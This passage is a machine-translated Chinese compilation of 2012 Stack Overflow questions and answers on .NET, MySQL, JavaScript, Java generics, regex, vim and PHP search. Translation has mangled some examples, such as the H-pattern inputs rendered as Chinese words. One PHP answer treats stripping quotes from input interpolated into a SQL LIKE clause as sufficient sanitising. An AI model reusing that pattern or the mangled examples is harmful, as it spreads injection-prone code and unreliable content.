在第二个示例中，复制构造函数被显式创建并复制`name`指向的数据。这样，`name`in`student2`就是指向复制的数据。

# .net - 从文本框 vb.net 2008 中过滤选定的行

> ID：11702463
> 
> 赞同：0
> 
> 时间：2012-07-28T15:49:34.877
> 
> 标签：.net, text, filter, textbox

如果文本是这样写的，我想从文本框中提取：

> 标题：DLF 现在在古尔冈推出令人惊叹的 DLF_CITY_CENTRE
> 
> 描述：物业详情 国家首都
> 地区 (NCR) 的第一个购物中心位于古尔冈沿 Mehrauli Gurgaon 路。
> 它还设有 3 屏幕多厅、DT 电影院，并设有许多
> 餐厅，如 Moti Mahal 通用设施规格
> * 该开发项目的总可出租面积为 260,000 平方英尺，目前由 Lifestyle 百货公司提供。
> * 商场还提供最多可停放 700 辆车的停车场。欲了解更多详情，请联系我们......！！！！手机：09990000000
> 网址：www.timberwala.com

我想要标题、描述、位置、移动设备、网站之后的唯一文本，并且内容是动态的。

问：我可以在文本框中获取文本，但现在我想将标题、描述等中的数据获取到多个文本框中，例如

文本框 1 的标题 文本框 2 的
描述

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T17:36:00.280

您最好的选择是使用正则表达式将字符串分开并将其解析为您想要的单个字段 - 您不必使用正则表达式，因为您可以使用 .NETs 本机字符串操作（例如 SubString 等) 但正则表达式更加灵活和强大。

我会推荐这个线程作为正则表达式的入门：[学习正则表达式](https://stackoverflow.com/questions/4736/learning-regular-expressions)

我不能保证他们在线程中提到的 RegEx Buddy，但我确实发现 Expresso 在计算表达式方面非常方便。它是免费的，可在以下网址获得：[http ://www.ultrapico.com/Expresso.htm](http://www.ultrapico.com/Expresso.htm)

使用 .NET 字符串方法的示例：

```
Dim Title As String = TextBox1.Text.Substring(TextBox1.Text.IndexOf("Title:") + 6, TextBox1.Text.IndexOf("Description:") - 6).Trim() 
```

（非常简单）使用正则表达式的示例（确保导入 System.Text.RegularExpressions）

```
Dim Description As String = Regex.Split(TextBox1.Text, "Description:", RegexOptions.Multiline And RegexOptions.IgnoreCase)(1).Trim 
```

# mysql - 启动 MySQL 守护进程时遇到问题

> ID：11702464
> 
> 赞同：0
> 
> 时间：2012-07-28T15:49:38.403
> 
> 标签：mysql, database, daemon, dedicated-server

我是这里论坛的新手，但我希望变得更加活跃，因为我最近购买了一个专用服务器并且我正在使用它运行 Fedora，所以这是一个不断学习的过程，我在 BASH 方面相当平均，但我足够了解我的方式，我是一名软件开发人员，而不是网络技术人员。这导致了我最初的问题，我在重新启动我的 dedi 后启动我的 MySQL 守护程序时遇到问题，我不知道为什么它突然这样做，我正在从服务器运行 PHPMyAdmin 并通过 CLI 发出某些命令MySQL，但重新启动后，每次尝试启动守护程序实例时都会出现此错误：

```
[root@ks23085 ~]# service mysqld start
Redirecting to /bin/systemctl  start mysqld.service
[root@ks23085 ~]# systemctl mysqld start
Unknown operation mysqld
[root@ks23085 ~]# systemctl start mysqld
Failed to issue method call: Unit name mysqld is not valid.
[root@ks23085 ~]# systemctl start mysqld.service
[root@ks23085 ~]# mysql
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/path/to/mysql.sock' (2) 
```

这很奇怪，因为在我重新启动它之前它运行良好，我没有更新它或更改安装，我唯一做的就是安装 postfix，但我不明白为什么这会导致 MySQL 出现任何问题：小号

我真的需要帮忙，我已经尝试了谷歌的几种解决方案，但没有任何结果。提前谢谢各位。

～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

更新1：

好的，所以我找到了 mysqld 所在的目录，它是'/usr/libexec/mysqld'，我在这个目录中输入了'./mysqld start'，它指定了这个输出：

```
120729  1:49:09 [Warning] The syntax '--log-slow-queries' is deprecated and will be removed in a future release. Please use '--slow-query-log'/'--slow-query-log-file' instead.
120729  1:49:09 [Warning] The syntax '--log-slow-queries' is deprecated and will be removed in a future release. Please use '--slow-query-log'/'--slow-query-log-file' instead.
120729  1:49:09 [Warning] Can't create test file /run/mysql/ks23085.lower-test
120729  1:49:09 [Warning] Can't create test file /run/mysql/ks23085.lower-test
./mysqld: Can't change dir to '/run/mysql/' (Errcode: 2)
120729  1:49:09 [ERROR] Aborting

120729  1:49:09 [Note] ./mysqld: Shutdown complete 
```

～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 更新2：

我设法通过使用所有旧数据库在“运行/”中创建“mysql”目录来解决目录问题，但现在我似乎遇到了一个似乎不太容易修复的错误：/

这是输出：

```
120729  2:15:59 [Warning] The syntax '--log-slow-queries' is deprecated and will be removed in a future release. Please use '--slow-query-log'/'--slow-query-log-file' instead.
120729  2:15:59 [Warning] The syntax '--log-slow-queries' is deprecated and will be removed in a future release. Please use '--slow-query-log'/'--slow-query-log-file' instead.
120729  2:15:59 [Warning] Can't create test file /run/mysql/ks23085.lower-test
120729  2:15:59 [Warning] Can't create test file /run/mysql/ks23085.lower-test
120729  2:15:59 [Note] Plugin 'FEDERATED' is disabled.
120729  2:15:59 [Note] Plugin 'InnoDB' is disabled.
mysqld: Can't find file: './mysql/plugin.frm' (errno: 13)
120729  2:15:59 [ERROR] Can't open the mysql.plugin table. Please run mysql_upgrade to create it.
120729  2:15:59 [ERROR] mysqld: unknown option '--skip-locking'
120729  2:15:59 [ERROR] Aborting

120729  2:15:59 [Note] mysqld: Shutdown complete 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T18:08:40.563

[官方文档](http://forums.mysql.com/read.php?11,27769,59865)指出此错误有两个可能的原因：

> 1.  您无权访问目录 /var/lib/mysql/whatever.sock 因为 mysql 是该文件夹的所有者或
> 2.  /path/whatever.sock 不存在。

执行以下命令以找到您的套接字：

```
mysqladmin variables | grep socket 
```

按照建议添加到配置文件中：

> 您可以尝试一下 [Linux 特定，但还有哪些其他操作系统？] 转到 /etc/my.cnf 并更改/添加以下行：
> 
> [mysqld]
> 
> 数据目录=/var/lib/mysql
> 
> socket=/tmp/mysql.sock
> 
> [客户]
> 
> socket=/tmp/mysql.sock

2）不要忘记检查您的权限！

# asp.net-mvc-3 - 如何在 mvc3 razor 中创建和实现自定义数据类型

> ID：11702466
> 
> 赞同：1
> 
> 时间：2012-07-28T15:49:40.153
> 
> 标签：asp.net-mvc-3, razor, mvc-editor-templates, display-templates, custom-data-type

我用谷歌搜索这个问题太多次了。但我找不到任何解决方案来做到这一点。

我想创建一个`DataType`具有默认值的自定义`EditorTemplate`并`DisplayTemplate`用于**mvc3 razor**。

**模型**

```
[DataType("MyCustomDataType")]
public MyType Property { get; set; }
// I mean by MyType any type of data: string, int, datetime and so on 
```

**查看 - 剃刀**

```
@Html.DisplayFor(m => m.Property)
//or
@Html.EditorFor(m => m.Property) 
```

实际上我想用默认的编辑器模板和显示模板创建一个可重用的数据类型。

请问您有什么建议吗？你能给我一个有用的链接，或者如果可以的话，请给我一个简单的例子？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T18:06:06.390

[这](http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-1-introduction.html)是自定义编辑器/显示模板的优秀教程。虽然它不是剃刀语法，但它很容易转换。

如果要根据`Datatype`属性创建编辑器模板，可以使用获取属性值`ViewData.ModelMetadata.AdditionalValues["DataTypeAttribute"]`

如果该值是您的自定义数据类型值，请执行您想要的任何操作。否则，执行默认值。

不确定这是否是个好主意。但它应该工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:07:48.380

您可以创建一个新类型，即一个 Person 类，您可以将其包含在发送到视图的模型中。即 Model.Person。

通过定义一个名为 Person 的新 EditorTemplate 和 DisplayTemplate。默认情况下，调用 @Html.EditorTemplateFor(x=>x.Person); 将为该类型查找 EditorTemplate。

查看以下有关[“如何使用 asp.net mvc 编辑器模板”的 stackoverflow 帖子](https://stackoverflow.com/questions/4671562/how-to-use-asp-net-mvc-editortemplate)

# javascript - 如果用户确认关闭当前窗口，则在关闭当前窗口时打开一个新的浏览器窗口

> ID：11702467
> 
> 赞同：0
> 
> 时间：2012-07-28T15:49:51.197
> 
> 标签：javascript, jquery

我有一个场景，如果用户试图关闭当前的浏览器窗口，那么应该向他显示一个确认框。如果他确认关闭窗口，则该窗口应关闭并以不同的 url 打开新窗口。

我尝试使用以下代码来显示确认框，但如果用户确认关闭当前窗口，我无法弄清楚如何打开新窗口。

```
var preventUnloadPrompt;            
$('a').live('click', function () { preventUnloadPrompt = true; });
$('form').live('submit', function () { preventUnloadPrompt = true; });
$(window).bind("beforeunload", function () {
    if (preventUnloadPrompt)
    { return; }
    else {
        return confirm("quit??");            
    }
}); 
```

任何类型的帮助表示赞赏。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T18:54:25.960

当一个窗口关闭时，一切，绝对与该窗口相关的一切，无论是否可见......待处理的javascript代码，屏幕上的东西等都消失了，其中包括正在执行中的脚本 - 噗 - 消失了，基本上取消，中止，暂停，停止任何正在运行的脚本。

时序要求除了关闭窗口之外，所有其他用户发起的操作都必须首先完成。

例子：

```
javascript:
void(window.open("data:text/html,
<html>
<a href=\"javascript:window.open('about:blank');self.close();void(0);\">open & close</a> this link does both<br/>
<a href=\"javascript:self.close();window.open('about:blank');void(0);\">close & open</a> this does close but open fails
</html>
")) 
```

链接可以用`if(confirm("quit??")){ ... }`

测试：

```
window.navigator.userAgent =
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0 
```

书签：
[如果用户确认关闭当前窗口，则在关闭当前窗口时打开一个新的浏览器窗口](https://stackoverflow.com/questions/11702467/open-a-new-browser-window-on-close-of-current-window-if-user-confirms-to-close-c/12714964#12714964)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-28T16:00:10.347

```
var answer = confirm("quit??");
if (answer){
    window.open("http://www.google.com/");
}
else{
// do something else
} 
```

# mysql - Benerator with mysql: 使用 Mysql id auto-increment

> ID：11702468
> 
> 赞同：2
> 
> 时间：2012-07-28T15:49:59.387
> 
> 标签：mysql, testing, generator

从 Benerator (0.7.7) 开始，我在尝试为 Mysql 5.5 的测试表生成数据时遇到了一些问题。数据库。

benerator 脚本是： benerator_2.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<setup xmlns="http://databene.org/benerator/0.7.7"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://databene.org/benerator/0.7.7 benerator-0.7.7.xsd"
        defaultEncoding="Cp1252"
        defaultDataset="DE"
        defaultLocale="de_DE"
        defaultLineSeparator="\r\n">

<import defaults="true"/>
<import domains="person"/>
<import domains="address"/>
 <import platforms="db" />

    <comment>
         Populates a database
    </comment>

    <comment>defining a database that will be referred by the id 'db' later</comment>
    <database id="db"
        url="jdbc:mysql://localhost:3306/benerator"
        driver="com.mysql.jdbc.Driver"
        catalog="benerator"
        user="root"
        password="Arthur"/>

    <execute target="db">
        drop table if exists customer;
    </execute>

    <bean id="sg" class="SequenceTableGenerator">
    <property name="database" ref="db"/>
    <property name="table" value="MY_TABLE"/>
    <property name="column" value="SEQ_VALUE"/>
    </bean> 
    <execute target="db">
        create table customer (
            id bigint  null auto_increment,
            name varchar(255),
            pword varchar(20),
            address varchar(100),
            phone varchar(20),
            primary key (id)
        );
    </execute>

<generate type="testtable" consumer="db,ConsoleExporter" count="1000">
        <id name="id" mode="ignored" />

        <variable name="person" generator="PersonGenerator"  locale="${locale}"/>
        <variable name="address" generator="AddressGenerator" />    
        <attribute name="n" min="1" max="42" distribution="cumulated"/>
    <attribute name="name" script="{ftl:${person.givenName} ${person.familyName}}" />
    <attribute name="pword" pattern="[A-Za-z0-9]{8,12}" />
    <attribute name="address" script="{ftl:${address.street} ${address.houseNumber} ${address.city} ${address.country} ${address.postalCode} }" />
    <attribute name="phone" script="{ftl:${address.mobilePhone}}" />
</generate>

</setup> 
```

如图所示，表的主键，id 被声明为自动生成：

```
 id bigint  null auto_increment,
    ....
   primary key (id) 
```

为了告诉 Benerator 让忽略字段“id”，我设置

```
<id name="id" mode="ignored" /> 
```

生成的命令行是：

```
benerator benerator_2.xml 
```

这是输出：

```
17:47:02,823 INFO  (main) [CONFIG] Running file benerator_2.xml
17:47:02,825 INFO  (main) [CONFIG] Benerator 0.7.7 build 2164
17:47:02,827 INFO  (main) [CONFIG] Java version 1.6.0_23
17:47:02,827 INFO  (main) [CONFIG] JVM Java HotSpot(TM) 64-Bit Server VM 19.0-b0
9 (Sun Microsystems Inc.)
17:47:02,828 INFO  (main) [CONFIG] OS Windows 7 6.1 (amd64)
17:47:02,828 INFO  (main) [CONFIG] Installed JSR 223 Script Engines:
17:47:02,906 INFO  (main) [CONFIG] - Mozilla Rhino[js, rhino, JavaScript, javasc
ript, ECMAScript, ecmascript]
17:47:02,906 INFO  (main) [CONFIG] Max heap size: 853 MB
17:47:02,959 DEBUG (main) [CONFIG] Initializing Script mapping from file org/dat
abene/script/script.properties
17:47:04,012 DEBUG (main) [COMMENT] Populates a database
17:47:04,019 DEBUG (main) [COMMENT] defining a database that will be referred by
 the id 'db' later
17:47:04,059 INFO  (main) [EvaluateStatement] Executing inline script
17:47:06,622 INFO  (main) [JDBC] Connected to MySQL 5.5.16
17:47:06,622 INFO  (main) [JDBC] Using driver MySQL-AB JDBC Driver mysql-connect
or-java-5.1.12 ( Revision: ${bzr.revision-id} )
17:47:06,624 INFO  (main) [JDBC] JDBC version 3.0
17:47:07,530 INFO  (main) [EvaluateStatement] Executing inline script
17:47:08,492 INFO  (main) [JDBCDBImporter] Importing tables from ___temp
17:47:08,578 INFO  (main) [DBSystem] Fetching table details and ordering tables
by dependency
Exception in thread "main" java.lang.NullPointerException
        at org.databene.benerator.composite.AbstractGeneratorComponent.init(Abst
ractGeneratorComponent.java:65)
        at org.databene.benerator.engine.statement.GenerateAndConsumeTask.initSt
atements(GenerateAndConsumeTask.java:269)
        at org.databene.benerator.engine.statement.GenerateAndConsumeTask.init(G
enerateAndConsumeTask.java:119)
        at org.databene.benerator.engine.statement.GenerateOrIterateStatement.be
Initialized(GenerateOrIterateStatement.java:165)
        at org.databene.benerator.engine.statement.GenerateOrIterateStatement.ex
ecute(GenerateOrIterateStatement.java:106)
        at org.databene.benerator.engine.statement.LazyStatement.execute(LazySta
tement.java:58)
        at org.databene.benerator.engine.statement.StatementProxy.execute(Statem
entProxy.java:45)
        at org.databene.benerator.engine.statement.TimedGeneratorStatement.execu
te(TimedGeneratorStatement.java:66)
        at org.databene.benerator.engine.statement.SequentialStatement.executeSu
bStatements(SequentialStatement.java:51)
        at org.databene.benerator.engine.statement.SequentialStatement.execute(S
equentialStatement.java:46)
        at org.databene.benerator.engine.BeneratorRootStatement.execute(Benerato
rRootStatement.java:63)
        at org.databene.benerator.engine.DescriptorRunner.execute(DescriptorRunn
er.java:135)
        at org.databene.benerator.engine.DescriptorRunner.runWithoutShutdownHook
(DescriptorRunner.java:116)
        at org.databene.benerator.engine.DescriptorRunner.run(DescriptorRunner.j
ava:109)
        at org.databene.benerator.main.Benerator.runFile(Benerator.java:88)
        at org.databene.benerator.main.Benerator.runFromCommandLine(Benerator.ja
va:76)
        at org.databene.benerator.main.Benerator.main(Benerator.java:69) 
```

所以我主要得到

```
Exception in thread "main" java.lang.NullPointerException 
```

那么问题出在哪里？提前致谢

# linux - vim 和 sudo vim 在 openSUSE 上使用不同的设置

> ID：11702470
> 
> 赞同：3
> 
> 时间：2012-07-28T15:50:21.133
> 
> 标签：linux, vim, sudo, folding

我希望 vim 在关闭文件后保存折叠的代码。我已将以下代码添加到 /etc/vimrc 和 ~/.vimrc：

```
au BufWinLeave ?* mkview
au BufWinEnter ?* silent loadview 
```

当我以普通用户（vim 文件）身份打开文件时，它按预期工作。如果我改为使用 sudo vim 文件打开，它不会保存折叠代码。

我知道 /etc/vimrc 正在被读取。我的主题设置在该文件的底部并且工作正常。上周我在安装 vim 环绕插件时遇到了类似的问题。当它安装在 ~/.vim 中时，它仅适用于 vim 文件。为了让它与 sudo 一起工作，我必须在 /usr/share/vim/current 中单独安装它。这可能是什么原因造成的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:37:59.487

## 序言

事实上你回答了你的问题，所以这确实是你以前遇到的同样的问题。它是由 Vim 用来查找其配置的算法引起的（请参阅 参考资料`:help initialization`）。但我不会称你的解决方案是正确的。有关`:help $VIM`如何在`sudo`环境中使用配置的信息（例如 being `root`），请参阅。

## 至于你现在的问题。

请参阅文档中的以下引用。`:help :mkview`：

```
:mkvie[w][!] [file] ...
        When [file] is omitted or is a number from 1 to 9, a
        name is generated and 'viewdir' prepended.
                    ... 
```

并且`:help 'viewdir'`：

```
 'viewdir' 'vdir'   string (default for ... for Unix: "~/.vim/view", ... 
```

因此，在完成`sudo`所有视图之后，Vim 将存储在`/root/.vim`.

## 解决方案

`viewdir`指向您的目录，`~/.vim/view`其中包含以下内容`/root/.vimrc`：

```
:set viewdir=/home/user/.vim/view 
```

但是，这种方法本身存在一些问题：

1.  更新 root 保存的视图会导致权限错误。
2.  您将无法为`/root`或下的文件传递存储的视图`/home/user`，因为 Vim 使用波浪号而不是完整路径生成文件名。

第一个问题可以通过在执行命令后立即运行`chown`或`chmod`在新的视图文件上解决。`:mkview`它应该是这样的：

```
execute '!chown user:group' eval('&viewdir').'/'.substitute(expand('%:p:~'), '/', '+=', 'g').'=' 
```

但我不知道第二个问题的好解决方案，只能建议编写一个脚本将文件名转换为完整路径。

# cocos2d-iphone - 渲染基于矩形的小地图

> ID：11702472
> 
> 赞同：0
> 
> 时间：2012-07-28T15:50:38.310
> 
> 标签：cocos2d-iphone

Cocos2d-iPhone，1.0.1。

我的游戏有地图。我有一个包含`NSValues`( `CGRects`) 的数组，它基本上代表地图中的碰撞。无论如何，我需要的是创建一个几乎是灰色背景的纹理，黑色填充的矩形代表我的矩形，稍后我将使用这个纹理来创建我的小地图。

无论如何，问题在于纹理创建部分。我想知道这一点，因为创建`CCSprites`来代表我的矩形有点不可能（每张地图有数百个！）。我也考虑过用诸如此类的东西绘制图元`CCDrawLine`，但我对此不太确定。

你有什么建议吗？您将如何创建纹理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T21:29:03.660

创建小地图意味着创建您用来表示游戏世界的任何地图的缩小版本。

一种可行的方法是缩小地图图层（CCTMXTiledMap？），使其适合小地图的大小。然后将其渲染到 CCRenderTexture 上。这可能很耗时，因此最好不要每帧更新小地图渲染纹理。

或者循环遍历您的 tilemap，并为每个 tile 使用基于 tile 类型（草、山、水等）的给定颜色在适当位置将单个像素渲染到渲染纹理上。如果生成的小地图太大或太小，请放置 2x2 像素或更多像素或缩小渲染纹理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T20:54:28.037

对我来说听起来像是一个[基于瓷砖的游戏](http://www.raywenderlich.com/1163/how-to-make-a-tile-based-game-with-cocos2d)。

# c# - 在 Ninject 3.0 中绑定泛型类型

> ID：11702477
> 
> 赞同：2
> 
> 时间：2012-07-28T15:51:27.233
> 
> 标签：c#, .net, generics, ninject, ioc-container

我希望 Ninject 为实现泛型接口的特定程序集中的所有类型创建绑定，而无需在运行时全部指定它们。有点像 Autofac 中开放泛型的工作方式。

这就是我想出的...

```
kernel.Bind(x => x.FromThisAssembly()
    .SelectAllClasses()
    .Where(t => t.IsAssignableFrom(
        typeof(ICommandHandler<>)))
        .BindAllInterfaces()); 
```

调用下面的方法，我希望实现所有类型的数组，`ICommandHandler<T>`但它没有产生任何结果......

```
public void Process<TCommand>(TCommand command) 
    where TCommand : ICommand
{
    var handlers = 
        _kernel.GetAll<ICommandHandler<TCommand>>();

    foreach(var handler in handlers)
    {
        handler.Handle(command);
    }
} 
```

有没有现有的方法来实现这一目标？还是我需要使用约定 API 自行开发？

这似乎是一种相当普遍的模式，并且想知道是否可以在不编写我自己的实现的情况下实现这一点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-30T08:32:56.650

由于两个问题，您的绑定完全没有做任何事情：

1.  IsAssignableFrom 期望参数的顺序相反。你指定

    ```
    SomeCommand x = new ICommand<>(); 
    ```

2.  封闭的泛型类不能分配给开放的泛型类型。或者换句话说

    ```
    ICommand<> x = new SomeCommand(); 
    ```

    不是有效代码。

你想要的是：

```
kernel.Bind(x => x.FromThisAssembly()
                  .SelectAllClasses().InheritedFrom(typeof(ICommandHandler<>))
                  .BindAllInterfaces()); 
```

# java - 摘要列表

> ID：11702479
> 
> 赞同：0
> 
> 时间：2012-07-28T15:51:49.323
> 
> 标签：java, android, arraylist, abstract-class

*更新：我的课程比这更复杂，我只是卡在 ArrayList 行*

我有以下课程：

```
class CatList {

    List<Cat> cats = new ArrayList<Cat>();

} 
```

和

```
class DogList {

    List<Dog> dogs = new ArrayList<Dog>();

} 
```

其中 Cat 和 dog 都是数据类。

但我想创建一个抽象类：

```
abstract class AnimalList {

    List<???> animals;

    AnimalList(Class animal) {

        animals = new ArrayList<???>();

    }
} 
```

这样我就可以继承我的类

```
AnimalList CatList = new AnimalList(Cat);
AnimalList DogList = new AnimalList(Dog);
AnimalList CowList = new AnimalList(Cow); 
```

希望这更有意义。因此，我的问题是什么是？？？位？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T16:17:16.243

使用类型参数可能会解决您的问题 - 对不同类型使用相同的类 - 无需继承：

```
public class AnimalList<T> {
  private List<T> list = new ArrayList<T>();

  public void add(T animal) {
    list.add(animal);
  }
  // more methods
} 
```

现在您可以为人和动物参数化实例：

```
AnimalList<Cat> catList = new AnimalList<Cat>();
catList.add(new Cat());
AnimalList<Dog> dogList = new AnimalList<Dog>();
dogList.add(new Dog()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:51:46.587

我的建议是，为 Dog 和 Cat 创建一个基类，比如说 Animal。这样您就可以节省一些时间，因为您不必在两个类中编写相同的方法和成员，它的工作方式如下：

```
public (abstract) class Animal
{
    members and functions, that both Cats, and Dogs have... 
} 
```

然后像这样从 Animal 继承：

```
public class Cat extends Animal
{
    ...
} 
```

从现在开始，您可以像这样创建一个 ArrayList：

```
ArrayList<Animal> animals = new ArrayList<Animal>();
animals.add(new Cat());
animals.add(new Dog()); 
```

如果您无论如何都想创建一个 AnimalList，那么您最好的选择是 Andreas 的解决方案，泛型适用于这种情况。

如果你知道继承是如何工作的，并且你已经考虑过像这样构建你的应用程序，那么对不起我的帖子！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T19:26:30.560

如前所述，您可能希望为 Cat 和 Dog 定义一个基类 Animal，然后：

```
class AnimalList<T extends Animal> {

    private List<T> animals;

    protected AnimalList() {
       animals = new ArrayList<T>();
    }
} 
```

如果您需要传递 Class 您可能希望将 yje 构造函数定义为：

```
AnimalList(Class<T> type) { … } 
```

如果您需要为某些未知的 Animal 类型处理一些 AnimalList，您可以使用：

```
private AnimalList<? extends Animal> list; 
```

# regex - 正则表达式匹配模式一次或多次，没有部分匹配

> ID：11702481
> 
> 赞同：3
> 
> 时间：2012-07-28T15:52:16.857
> 
> 标签：regex, grep

用例子更好地解释：

1.  **HHH**
2.  **呼呼呼**
3.  **哈哈哈哈哈**
4.  **HHHHH**
5.  **BB**
6.  **HHBH**

我需要想出一个只匹配 3 个 H 或 3 个 H 的倍数的正则表达式（所以 6、9、12、... H 也可以），而 5 个 H**不行**。如果可能的话，我不想使用 Perl 正则表达式。

因此，对于上面的输入，正则表达式将仅匹配 (1)、(3) 和 (6)。我只是从这里的正则表达式开始，所以我不完全知道我应该如何处理这个问题。

**编辑** 只是为了澄清一些事情：一个H只能在一组3个H中。3 个 H 的组可能是 HHH 或 HHBH。这就是为什么在上面的示例 2 中它不匹配，因为最后一个 H 不在一组 3 个 H 中。而且你不能取组中的最后 3 个 H，因为中间的 2 个 H 之前已经在一个组中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:57:19.290

您可以使用以下正则表达式：

```
^([^H]*H[^H]*H[^H]*H[^H]*)+$ 
```

它匹配任何总共包含 3 个 H 或 3 的任何倍数的字符串。中间可能有任何其他字符。

解释：

```
^              begin of string
(              start of group
  [^H]*H       any string of characters (or none) not including 'H' plus a single 'H'
  [^H]*H       any string of characters (or none) not including 'H' plus a single 'H'
  [^H]*H       any string of characters (or none) not including 'H' plus a single 'H'
  [^H]*        any string of characters (or none) which is not 'H'
)+             containing the group once or twice or ...
$              end of string 
```

通过重复子模式`[^H]*H`3 次，我们确保确实包含 3 个`H`，`[^H]*`允许任何分隔字符。

*注意：使用其中`egrep`之一或运行带有附加参数的 grep `-E`。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T16:17:36.447

假设 H 可以与非 H 任意交错，但 H 的总数必须是 3 的非零倍数（因此 XXX，不包含 H，不匹配），则总正则表达式为任何事情都不是微不足道的。这不是初学者的正则表达式。

我将假设正则表达式的方言将`{}`和`()`视为用于计数和分组的元字符，并包含`+`一个或多个。如果您正在使用具有不同要求的正则表达式系统（`\{\}`例如），请相应地进行调整。

您需要正则表达式来匹配整个字符串，因此不允许出现杂散 H。因此，它必须以 开头`^`和结尾`$`。您需要在前后允许任意数量的非 H。H 可以由任意数量的非 H 分隔。这导致：

```
^([^H]*H[^H]*H[^H]*H)+[^H]*$ 
```

哎哟; 这很难读！它表示该行必须由 1 个或多个 ( `+`) 组任意数量的非 H 后跟一个 H、任意数量的非 H、另一个 H、任意数量的非 H 和第三个 H 组成；所有这些都可以后跟任意数量的非H。

使用`{}`计数：

```
^(([^H]*H){3})+[^H]*$ 
```

这仍然很难阅读。请注意，我的描述是“前后任意数量的非 H”，但我只`[^H]*`在后面使用；这是因为重复模式允许任意数量的非 H 出现在前面，因此无需重复该片段。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-28T15:54:45.203

使用它来匹配 3 个 H 的倍数：

```
(H{3})+ 
```

这是您示例的完整正则表达式：

```
^(H{3})+B*(H{3})*$ 
```

编辑：看起来你需要计算非连续的 H。在这种情况下：

```
^(([^H]*H){3})+[^H]*$ 
```

这应该匹配任何具有 3 个 H 倍数的字符串。

# jquery - 在 HTML 页面中启用自定义文本选择样式

> ID：11702482
> 
> 赞同：0
> 
> 时间：2012-07-28T15:52:18.560
> 
> 标签：jquery

[当我在John Resig](http://ejohn.org/blog/javascript-pretty-date/)浏览 John Resig 的官方网站时，我注意到如果我尝试通过按下鼠标按钮并拖动目标文本来选择页面中的任何文本，而不是在所选文本中出现蓝色背景到目前为止（以及将所选文本的颜色设置为白色），所选文本逐渐呈现为蓝色，而背景颜色没有任何变化。我怎样才能做到这一点？我认为可能可以使用一些复杂的`selectStart`和`setSelection`功能组合，但它们的支持非常有限。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:54:57.903

调整一下:)

```
::-moz-selection {
   background-color: #317572;
   color: #fff;
}
::selection {
    background-color: #317572;
    color: #fff;
} 
```

# jquery - 可滚动覆盖

> ID：11702483
> 
> 赞同：0
> 
> 时间：2012-07-28T15:52:29.153
> 
> 标签：jquery, overlay, jquery-tools

我正在使用[http://jquerytools.org](http://jquerytools.org)覆盖。
我在这里找到了阻止 jquery 工具叠加层后面的页面滚动的方法，这很好，直到我的叠加层元素不高于我的屏幕。
我知道这是可能的，因为在[http://pinterest.com](http://pinterest.com)中它的工作方式如我所愿。我正在查看他们的代码，但无法理解如何制作它。
任何真实（简单）的例子如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:33:36.603

我在 pininterest 上看到身体上有一个“noscroll”类：

```
 <body id="CategoriesBarPage" class="hidefixed noscroll" data-twttr-rendered="true"> 
```

“noscroll”使用溢出：隐藏。我刚刚在 jsfiddle 上的演示中的 body 标签上尝试了这个，它可以工作。

# php - PHP MySQL - 带空格的搜索字段

> ID：11702486
> 
> 赞同：1
> 
> 时间：2012-07-28T15:53:07.107
> 
> 标签：php, mysql, search

这可能是一件非常容易的事情。我正在构建一个搜索工具。我有一个包含地址的 varchar 字段。例子：

```
2343 S Cherry Creek St. 
```

所以我希望能够搜索部分或全部字段。我努力了

```
LIKE '%$address%' 
```

但是当最终用户输入

```
"2343 S Cherry" 
```

它不返回任何结果。当用户只输入一个单词时，它会起作用：

```
"2343" 
```

它返回正确的记录。所以这让我认为这是不允许它搜索整个术语的空间。

有人可以告诉我如何构建它，以便最终用户可以使用多个单词搜索地址字段。我知道这与使用 LIKE, %% 有关，但我需要它来允许空格。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:14:49.070

我的导入出错了。因此，正在导入数据库的地址正在添加和额外的空间。因此，当人们在单词之间使用一个空格进行搜索时，它会返回 0 个结果，因为数据库中的数据有两个空格。我已经修复了我的导入脚本，它现在可以工作了。谢谢你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:28:31.497

问题不在于空格，而在于您如何通过 PHP 插入用户输入。

看看这个[**SQLFiddle 演示**](http://sqlfiddle.com/#!2/49c2c/2/1)。

* * *

也许问题在于您似乎允许用户在输入中输入引号，以便他们可以对整个字符串执行搜索。

您要做的是消除 PHP 中的引号，然后将输入插入 SQL 语句或作为绑定参数：

```
$address = strtr($address, array('"' => '', "'" => '')); 
```

这将从您的字符串中删除单引号和双引号。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:02:17.323

尝试这个

```
$arr = explode(' ', $address);
if (count($arr)) {
